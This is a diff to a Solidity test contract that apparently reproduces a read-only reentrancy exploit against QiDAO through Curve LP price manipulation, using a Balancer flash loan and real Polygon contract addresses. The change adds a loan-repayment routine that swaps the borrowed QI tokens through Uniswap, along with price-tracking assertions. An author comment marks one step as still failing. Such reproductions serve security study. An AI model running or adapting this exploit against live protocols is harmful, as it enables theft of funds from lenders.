@@ -5,6 +5,7 @@ import "forge-std/Test.sol";
 import {TestHarness} from "../../TestHarness.sol";
 
 import {BalancerFlashloan} from "../../utils/BalancerFlashloan.sol";
+import {IUniswapV2Router02} from "../../utils/IUniswapV2Router.sol";
 
 import {IERC20} from "../../interfaces/IERC20.sol";
 import {IWETH9} from "../../interfaces/IWETH9.sol";
@@ -49,12 +50,16 @@ interface ICurvePool {
     function add_liquidity(uint256[2] memory amounts, uint256 min_min_amount, bool use_eth) external payable returns(uint256);
     function remove_liquidity(uint256 amount, uint256[2] calldata min_amounts , bool use_eth) external payable;
     function token() external pure returns (address);
+    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy, bool use_eth) external payable returns (uint256);
 }
+
+
 
 contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
     // The tokens involved in the pool
-    IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
+    IWETH9 WMATIC = IWETH9(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
     IERC20 stLIDOMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);
+    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
 
     // Beefy delegators. Beefy is an Vault that wants LP_TOKENS from
     // Curve pools.
@@ -75,6 +80,9 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
     ICurvePool constant CURVE_POOL = ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
     IERC20 CURVE_LP_TOKEN = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);
 
+    // UniswapV2Router
+    IUniswapV2Router02 router = IUniswapV2Router02(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
+
     // Let's store the price of the LP tokens in different moments of the transaction
     // To see how it goes up during the reentrancy and then comes back to normal
     uint256 priceAtBeginning;
@@ -92,6 +100,8 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         cheat.label(address(CURVE_POOL), "Curve Pool");
         cheat.label(address(CURVE_LP_TOKEN), "LP Token");
         cheat.label(address(QIDAO_DELEGATOR), "QiDAO Delegator");
+
+        cheat.deal(address(this), 0);
     }
 
     function test_attack() external {
@@ -110,10 +120,13 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         _amounts[1] = 19664260000000000000000000;
 
         priceAtBeginning = get_lp_token_price_for_compound();
-        console.log("PRICE at beginnign");
+        console.log("==== INITIAL PRICE ====");
         console.log(priceAtBeginning);
         balancer.flashLoan(address(this), _tokens, _amounts, "");
-        console.log("finished flashloan");
+
+        console.log("\n==== FLASHLOAN REPAID ====");
+        require(priceAtBeginning > priceDuringCallback, "Intial price smaller than during the attack");
+        require(priceDuringCallback > priceAfterCallback, "Price during the attack smaller than the ending price");
     }
 
     fallback() external payable {
@@ -133,7 +146,7 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         // than they are. Once we get our borrow, repay the flashloan
         // and finish
         priceDuringCallback = get_lp_token_price_for_compound(); //
-        console.log("PRICE at callback");
+        console.log("\n==== PRICE DURING THE ATTACK (CALLBACK) ====");
         console.log(priceDuringCallback);
 
         // Borrow as much as we can and then check that
@@ -164,7 +177,14 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         require(tokens.length == 2 && tokens.length == amounts.length, "length missmatch");
         require(address(tokens[0]) == address(WMATIC));
         require(address(tokens[1]) == address(stLIDOMATIC));
+        
+        console.log(IERC20(tokens[0]).balanceOf(address(this)));
+        console.log(IERC20(tokens[1]).balanceOf(address(this)));
+        console.log("qi", QIDAO.balanceOf(address(this)));
+       
+        console.log(address(this).balance);
 
+        
         // Add to the pool all my WMATIC and stLIDOMATIC, I will
         // receive LP tokens in return
         WMATIC.approve(address(CURVE_POOL), amounts[0]);
@@ -204,6 +224,8 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         CURVE_POOL.remove_liquidity(lp_tokens_now, minAmounts, true);
 
         priceAfterCallback = get_lp_token_price_for_compound();
+
+        console.log("\n==== PRICE AFTER THE ATTACK (CALLBACK) ====");
         console.log(priceAfterCallback);
 
         // We now acquired a bad debt... good luck recovering your borrowed
@@ -214,7 +236,28 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         require(liquidity == 0, "i can't take any more debt but who cares?");
 
         // We now have to repay the flashloan and be on our way.
+        repayLoan(amounts);
 
+    }
+
+    function repayLoan(uint256[] memory amounts) internal {
+        // We swap to get the repayment tokens
+        QIDAO.approve(address(router), type(uint256).max);
+
+        address[] memory path = new address[](3);
+        path[0] = address(QIDAO);
+        path[1] = address(USDC);
+        path[2] = address(WMATIC);
+
+        // We request the amount received as no fees were paid for this loan
+        uint256 amountIn = QIDAO.balanceOf(address(this));
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 1, path, address(this), block.timestamp); // Qi Tokens for WMATIC
+
+        CURVE_POOL.exchange(1, 0, 20000000000000000000000, 8964360265059868271032, false); // ---------- THIS IS FAILING. Tried with locals (balanceOf) also.
+        WMATIC.deposit{value: address(this).balance}();
+        
+        WMATIC.transfer(address(balancer), amounts[0]);
+        stLIDOMATIC.transfer(address(balancer), amounts[1]);
     }
 
     // Gets the price of Curve LP tokens (Beefy's underlying) according to the
